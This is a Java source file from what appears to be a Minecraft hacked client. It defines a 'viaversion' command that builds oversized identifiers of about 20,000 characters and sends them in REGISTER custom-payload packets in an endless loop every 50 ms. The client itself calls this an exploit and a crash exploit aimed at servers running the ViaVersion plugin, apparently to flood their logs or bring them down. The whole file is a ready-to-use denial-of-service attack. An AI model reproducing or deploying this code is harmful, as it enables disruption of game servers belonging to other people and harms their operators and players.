package io.github.spigotrce.paradiseclientprivate.exploit;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientfabric.exploit.Exploit;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.fabricmc.fabric.impl.networking.RegistrationPayload;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;

import java.util.ArrayList;

public class ViaVersionExploit extends Command {
    public ViaVersionExploit(MinecraftClient client) {
        super("viaversion", "ViaVersion logs fucker", client);
    }

    public void execute() {
        Helper.printChatMessage("Executing ViaVersion exploit!");
        Helper.printChatMessage("Preparing payload!");
        ArrayList<Identifier> list = new ArrayList<>();

        new Thread(() ->
        {
            StringBuilder s = new StringBuilder("a");
            s.append("a".repeat(20000));
            String j = s.toString();
            for (int i = 0; i < 100; i++)
                list.add(
                        Identifier.of(j)
                );
            Helper.printChatMessage("Payload prepared!");
            Helper.printChatMessage("Sending payload packets!");
            while (true) {
                Helper.sendPacket(
                        new CustomPayloadC2SPacket(
                                new RegistrationPayload(
                                        RegistrationPayload.REGISTER,
                                        list
                                )
                        )
                );

                try {
                    Thread.sleep(50);
                } catch (InterruptedException e) {
                    Helper.printChatMessage("[CrashExploit] [ViaVersion] Unable to sleep 50ms");
                }
            }
        }).start();
    }

    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> build() {
        return literal(getName())
                .executes(
                        context -> {
                            execute();
                            return SINGLE_SUCCESS;
                        }
                );
    }
}
